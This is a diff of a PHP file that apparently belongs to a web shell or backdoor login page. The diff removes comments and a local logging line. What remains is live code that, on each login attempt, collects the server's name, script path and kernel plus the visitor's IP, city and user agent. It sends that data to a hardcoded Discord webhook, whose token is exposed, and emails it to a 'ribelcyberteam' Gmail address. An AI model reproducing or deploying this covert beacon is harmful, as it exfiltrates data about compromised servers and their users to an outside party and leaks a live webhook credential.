@@ -1,9 +1,4 @@
 <?php
-// ============================================
-// LOGIN TRACKING SYSTEM
-// ============================================
-
-// Fungsi untuk mengirim ke Discord
 function sendToDiscord($data) {
     $webhook_url = "https://discord.com/api/webhooks/1465729069164531926/HlIYmf_OVuJ8vsacthy_GkavLPxwa1YVvVN4Tt0nt8lDVb3xKxVGCO2kp8e2eTX-iW8i";
     
@@ -43,7 +38,6 @@ function sendToDiscord($data) {
     return $result;
 }
 
-// Deteksi jika ada login attempt
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loginin'])) {
     $password = $_POST['pass'] ?? '';
     $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
@@ -52,8 +46,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loginin'])) {
     $server_name = $_SERVER['SERVER_NAME'] ?? 'Unknown';
     $php_self = $_SERVER['PHP_SELF'] ?? 'Unknown';
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-    
-    // Data untuk dikirim
     $login_data = [
         'ip' => $user_ip,
         'city' => $city,
@@ -62,8 +54,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loginin'])) {
         'kernel' => $kernel,
         'user_agent' => $user_agent
     ];
-    
-    // 1. Kirim ke Email
     $email_message = "=================================\n";
     $email_message .= "LOGIN REPORT - " . date('Y-m-d H:i:s') . "\n";
     $email_message .= "=================================\n";
@@ -76,12 +66,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loginin'])) {
     $email_message .= "=================================\n";
     
     @mail('ribelcyberteam@gmail.com', '🚨 Login Report - ' . date('H:i:s'), $email_message);
-    
-    // 2. Kirim ke Discord
     @sendToDiscord($login_data);
-    
-    // 3. Log ke file lokal (debug)
-    @file_put_contents('login_logs.txt', $email_message . "\n\n", FILE_APPEND);
 }
 
 // ============================================
